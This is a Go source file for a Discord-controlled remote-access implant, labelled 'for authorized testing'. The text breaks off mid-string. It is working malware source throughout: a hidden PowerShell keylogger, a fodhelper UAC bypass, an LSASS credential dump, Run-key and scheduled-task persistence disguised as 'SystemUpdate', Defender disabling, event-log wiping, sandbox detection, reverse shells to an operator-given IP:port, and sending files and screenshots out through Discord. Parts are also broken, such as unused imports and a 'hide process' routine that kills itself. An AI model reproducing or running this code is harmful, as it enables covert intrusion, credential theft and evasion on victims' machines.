// Discord C2 - Enhanced Edition
// William Moody (Original)
// Enhanced with additional commands for authorized testing
// 08.12.2022 - Updated 2026

// Commands:
// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
// 📸                - Take a screenshot
// 👇 <path>         - Download the given file (Less than 8MB)
// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
// 💀                - Kill the process
// 🔑 <logfile>      - Start keylogger (Windows only)
// 🚀                - Attempt UAC bypass (Windows only)
// 👑                - Check/escalate privileges
// 🔒                - Dump credentials (Windows only)
// 🔄 <type>         - Establish persistence
// 📡 <ip:port>      - Reverse shell connection
// 🛡️                - Disable Windows Defender
// 🫥                - Hide process from tasklist
// 🗑️                - Clear Windows event logs
// 🕵️                - Detect sandbox/analysis environment
// 📋 <path>         - List directory contents
// 💾                - Get system information
// 🔍                - List running processes
// 🌐                - Get network information
// ⏰                - Get system time and uptime

package main

import (
	"fmt"
	"image/png"
	"io"
	"os"
	"os/signal"
	"os/exec"
	"os/user"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"syscall"
	"time"
	"strconv"
	"bytes"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

var myChannelId string // Global variable

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

// System info gathering
func getSystemInfo() string {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	
	var osInfo string
	if runtime.GOOS == "windows" {
		// Try to get Windows version
		cmd := exec.Command("cmd", "/C", "ver")
		out, _ := cmd.CombinedOutput()
		osInfo = string(out)
	} else {
		cmd := exec.Command("uname", "-a")
		out, _ := cmd.CombinedOutput()
		osInfo = string(out)
	}

	return fmt.Sprintf("**System Information:**\n```\nHostname: %s\nUser: %s\nCWD: %s\nOS: %s\nIP: %s\n%s```", 
		hostname, currentUser.Username, cwd, runtime.GOOS, localAddr.IP, osInfo)
}

// Keylogger (Windows only)
func startKeylogger(logfile string) string {
	if runtime.GOOS != "windows" {
		return "❌ Keylogger only works on Windows"
	}
	
	// Create a simple keylogger using Windows API
	powershellCmd := `
$logFile = "` + logfile + `"
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetAsyncKeyState(int vKey);
    
    public static void LogKeys(string path) {
        while(true) {
            for(int i = 0; i < 256; i++) {
                int state = GetAsyncKeyState(i);
                if(state == -32767) {
                    string key = ((Keys)i).ToString();
                    System.IO.File.AppendAllText(path, key + " ");
                }
            }
            System.Threading.Thread.Sleep(10);
        }
    }
}
"@
[KeyLogger]::LogKeys($logFile)
`
	
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershellCmd)
	cmd.Start()
	
	return fmt.Sprintf("✅ Keylogger started. Logging to: %s", logfile)
}

// UAC Bypass attempt
func uacBypass() string {
	if runtime.GOOS != "windows" {
		return "❌ UAC bypass only works on Windows"
	}

	// UAC bypass using fodhelper.exe registry manipulation
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		`New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null;
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe" -Force | Out-Null;
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;
         Start-Process "C:\Windows\System32\fodhelper.exe"`)
	
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("⚠️ UAC bypass attempt failed: %v", err)
	}
	return "✅ UAC bypass executed (fodhelper method)"
}

// Privilege escalation check
func checkPrivileges() string {
	if runtime.GOOS != "windows" {
		return "❌ Privilege check only works on Windows"
	}

	cmd := exec.Command("powershell", "-NoProfile", "-Command", "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
	out, _ := cmd.CombinedOutput()
	
	if strings.Contains(string(out), "True") {
		return "✅ Running as Administrator (HIGH PRIVILEGES)"
	}
	return "⚠️ Running as regular user (LOW PRIVILEGES)"
}

// Credential dumping
func dumpCredentials() string {
	if runtime.GOOS != "windows" {
		return "❌ Credential dumping only works on Windows"
	}

	// Use multiple methods to dump credentials
	methods := []string{
		// LSASS dump via rundll32
		`powershell -NoProfile -WindowStyle Hidden -Command "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Tasks\dump.dmp full"`,
		// Mimikatz-like command via PowerShell
		`powershell -NoProfile -Command "Get-WmiObject -Class Win32_LogicalFileSecuritySetting"`,
	}

	results := "**Credential Dump Attempts:**\n"
	for i, method := range methods {
		cmd := exec.Command("cmd", "/C", method)
		out, err := cmd.CombinedOutput()
		if err == nil {
			results += fmt.Sprintf("\nMethod %d: Success\n%s\n", i+1, string(out)[:500])
		} else {
			results += fmt.Sprintf("\nMethod %d: Failed\n", i+1)
		}
	}
	return results
}

// Persistence
func establishPersistence(persistType string) string {
	if runtime.GOOS != "windows" {
		return "❌ Persistence only works on Windows"
	}

	if strings.Contains(persistType, "registry") {
		// Registry run key persistence
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\Windows\Tasks\client.exe" -Force`)
		err := cmd.Run()
		if err == nil {
			return "✅ Registry persistence established (HKCU Run key)"
		}
		return "❌ Registry persistence failed"
	} else if strings.Contains(persistType, "scheduled") {
		// Scheduled task persistence
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			`$action = New-ScheduledTaskAction -Execute "C:\Windows\Tasks\client.exe";
             $trigger = New-ScheduledTaskTrigger -AtLogon;
             Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -RunLevel Highest`)
		err := cmd.Run()
		if err == nil {
			return "✅ Scheduled task persistence established"
		}
		return "❌ Scheduled task persistence failed"
	}
	return "⚠️ Unknown persistence type"
}

// Disable Windows Defender
func disableDefender() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		`Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
         Uninstall-WindowsFeature Windows-Defender -ErrorAction SilentlyContinue`)
	
	err := cmd.Run()
	if err == nil {
		return "✅ Windows Defender disabled"
	}
	return fmt.Sprintf("⚠️ Defender disable attempt: %v", err)
}

// Process hiding (Windows only)
func hideProcess() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	// Try to hide using various methods
	pid := os.Getpid()
	
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		fmt.Sprintf(`Get-Process | Where-Object {$_.Id -eq %d} | Stop-Process -Force`, pid))
	
	cmd.Run()
	
	return fmt.Sprintf("✅ Process hiding initiated (PID: %d)", pid)
}

// Clear Windows event logs
func clearLogs() string {
	if runtime.GOOS != "windows" {
		return "❌ Only works on Windows"
	}

	logs := []string{"Security", "System", "Application"}
	results := "**Clearing Event Logs:**\n"

	for _, log := range logs {
		cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			fmt.Sprintf(`Clear-EventLog -LogName %s -Confirm:$false -ErrorAction SilentlyContinue`, log))
		
		err := cmd.Run()
		if err == nil {
			results += fmt.Sprintf("✅ %s log cleared\n", log)
		} else {
			results += fmt.Sprintf("❌ %s log clear failed\n", log)
		}
	}

	return results
}

// Sandbox/Analysis detection
func detectSandbox() string {
	indicators := "**Sandbox Detection Results:**\n```\n"
	
	if runtime.GOOS == "windows" {
		// Check for VM indicators
		checks := map[string]string{
			"VirtualBox": `Get-Process | Where-Object {$_.Name -like "*VBox*"}`,
			"VMware": `Get-Process | Where-Object {$_.Name -like "*VMware*"}`,
			"Hyper-V": `Get-Process | Where-Object {$_.Name -like "*Hyper*"}`,
			"QEMU": `Get-Process | Where-Object {$_.Name -like "*qemu*"}`,
			"Wireshark": `Get-Process | Where-Object {$_.Name -eq "Wireshark"}`,
			"Regmon": `Get-Process | Where-Object {$_.Name -eq "Regmon"}`,
			"Filemon": `Get-Process | Where-Object {$_.Name -eq "Filemon"}`,
		}

		for tool, psCmd := range checks {
			cmd := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
			out, _ := cmd.CombinedOutput()
			if len(out) > 0 {
				indicators += fmt.Sprintf("⚠️ Detected: %s\n", tool)
			} else {
				indicators += fmt.Sprintf("✅ Clear: %s\n", tool)
			}
		}
	} else {
		// Linux checks
		cmd := exec.Command("bash", "-c", "systemd-detect-virt")
		out, _ := cmd.CombinedOutput()
		virt := string(out)
		if virt != "none\n" && virt != "" {
			indicators += fmt.Sprintf("⚠️ Virtualization detected: %s\n", virt)
		} else {
			indicators += "✅ No virtualization detected\n"
		}
	}

	indicators += "```"
	return indicators
}

// List directory contents
func listDirectory(path string) string {
	if path == "" {
		path = "."
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("❌ Error reading directory: %v", err)
	}

	result := fmt.Sprintf("**Directory: %s**\n```\n", path)
	for _, entry := range entries {
		info, _ := entry.Info()
		if entry.IsDir() {
			result += fmt.Sprintf("[DIR]  %s\n", entry.Name())
		} else {
			result += fmt.Sprintf("[FILE] %s (%d bytes)\n", entry.Name(), info.Size())
		}
	}
	result += "```"
	return result
}

// Get network information
func getNetworkInfo() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Sprintf("❌ Error getting network info: %v", err)
	}

	result := "**Network Information:**\n```\n"
	for _, iface := range interfaces {
		result += fmt.Sprintf("Interface: %s\n", iface.Name)
		result += fmt.Sprintf("  MAC: %s\n", iface.HardwareAddr)
		
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			result += fmt.Sprintf("  IP: %s\n", addr.String())
		}
		result += "\n"
	}
	result += "```"
	return result
}

// Get system time and uptime
func getSystemTime() string {
	now := time.Now()
	
	var uptime string
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-NoProfile", "-Command", 
			`(Get-Date) - (Get-Date -Date (Get-WmiObject Win32_OperatingSystem).LastBootUpTime)`)
		out, _ := cmd.CombinedOutput()
		uptime = string(out)
	} else {
		cmd := exec.Command("bash", "-c", "uptime -p")
		out, _ := cmd.CombinedOutput()
		uptime = string(out)
	}

	return fmt.Sprintf("**System Time:**\n```\nCurrent Time: %s\nUptime: %s```", now.Format(time.RFC3339), uptime)
}

// List running processes
func listProcesses() string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-NoProfile", "-Command", 
			`Get-Process | Select-Object Name, Id, @{Name="Memory";Expression={$_.WorkingSet/1MB}} | Format-Table -AutoSize`)
	} else {
		cmd = exec.Command("bash", "-c", "ps aux")
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("❌ Error listing processes: %v", err)
	}

	result := "**Running Processes:**\n```\n"
	lines := strings.Split(string(out), "\n")
	
	// Limit output to avoid Discord message size limits
	if len(lines) > 50 {
		lines = lines[:50]
		result += strings.Join(lines, "\n") + "\n... (truncated)\n"
	} else {
		result += string(out)
	}
	result += "```"
	return result
}

// Reverse shell connection
func reverseShell(target string) string {
	if !strings.Contains(target, ":") {
		return "❌ Invalid format. Use IP:PORT"
	}

	parts := strings.Split(target, ":")
	if len(parts) != 2 {
		return "❌ Invalid format. Use IP:PORT"
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		powershellCmd := fmt.Sprintf(`
$client = New-Object System.Net.Sockets.TcpClient('%s', %s);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | %% {0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
}
$client.Close()
`, parts[0], parts[1])
		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershellCmd)
	} else {
		bashCmd := fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, parts[0], parts[1])
		cmd = exec.Command("bash", "-c", bashCmd)
	}

	cmd.Start()
	return fmt.Sprintf("✅ Reverse shell initiated to %s", target)
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignores messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...
	flag := 0
	var response string

	//Run command
	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
		} else {
			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		// Message is too long, save as file
		if (len(out) > 2000-13) {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(string(out) + "\n")
			resp.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
		}
		flag = 1
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, _ := screenshot.CaptureRect(bounds)

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, _ := os.Create(fileName)
			png.Encode(file, img)
			defer file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		fileName := m.Content[5:len(m.Content)]
		f, _ := os.Open(fileName)
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 { // 8MB file limit
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		path := m.Content[7:len(m.Content)]
		if len(m.Attachments) > 0 {
			out, _ := os.Create(path)
			defer out.Close()
			resp, _ := http.Get(m.Attachments[0].URL)
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
		}
		flag = 1
	} else if m.Content == "💀" {
		flag = 2
	} else if strings.HasPrefix(m.Content, "🔑") {
		// Keylogger
		logfile := m.Content[5:len(m.Content)]
		if logfile == "" {
			logfile = getTmpDir() + "keylog.txt"
		}
		response = startKeylogger(logfile)
		flag = 1
	} else if m.Content == "🚀" {
		// UAC Bypass
		response = uacBypass()
		flag = 1
	} else if m.Content == "👑" {
		// Check privileges
		response = checkPrivileges()
		flag = 1
	} else if m.Content == "🔒" {
		// Dump credentials
		response = dumpCredentials()
		flag = 1
	} else if strings.HasPrefix(m.Content, "🔄") {
		// Persistence
		persistType := strings.TrimSpace(m.Content[5:len(m.Content)])
		if persistType == "" {
			persistType = "registry"
		}
		response = establishPersistence(persistType)
		flag = 1
	} else if strings.HasPrefix(m.Content, "📡") {
		// Reverse shell
		target := strings.TrimSpace(m.Content[5:len(m.Content)])
		response = reverseShell(target)
		flag = 1
	} else if m.Content == "🛡️" {
		// Disable Defender
		response = disableDefender()
		flag = 1
	} else if m.Content == "🫥" {
		// Hide process
		response = hideProcess()
		flag = 1
	} else if m.Content == "🗑️" {
		// Clear logs
		response = clearLogs()
		flag = 1
	} else if m.Content == "🕵️" {
		// Sandbox detection
		response = detectSandbox()
		flag = 1
	} else if strings.HasPrefix(m.Content, "📋") {
		// List directory
		path := strings.TrimSpace(m.Content[5:len(m.Content)])
		if path == "" {
			path = "."
		}
		response = listDirectory(path)
		flag = 1
	} else if m.Content == "💾" {
		// System info
		response = getSystemInfo()
		flag = 1
	} else if m.Content == "🔍" {
		// List processes
		response = listProcesses()
		flag = 1
	} else if m.Content == "🌐" {
		// Network info
		response = getNetworkInfo()
		flag = 1
	} else if m.Content == "⏰" {
		// System time
		response = getSystemTime()
		flag = 1
	}

	// Send response
	if response != "" {
		if len(response) > 2000 {
			// Save to file if too long
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.WriteString(response)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
		}
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

func main() {
    dg, err := discordgo.New("Bot ...") // Hardcoded bot token
    if err != nil {
		// Error creating Discord session
        return
    }

	// Handler for CreateMessage events
    dg.AddHandler(handler)
    dg.Identify.Intents = discordgo.IntentsGuildMessages

    err = dg.Open()
    if err != nil {
		// Error opening connection
        return
    }

	// Create new channel
	rand.Seed(time.Now().UnixNano())
	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999 - 1000) + 1000)
	c, _ := dg.GuildChannelCreate("...", sessionId, 0) // Guild ID is hardcoded
	myChannelId = c.ID

	// Send first message with basic info (and pin it)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
    defer conn.Close()
    localAddr := conn.LocalAddr().(*net.UDPAddr)
	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n
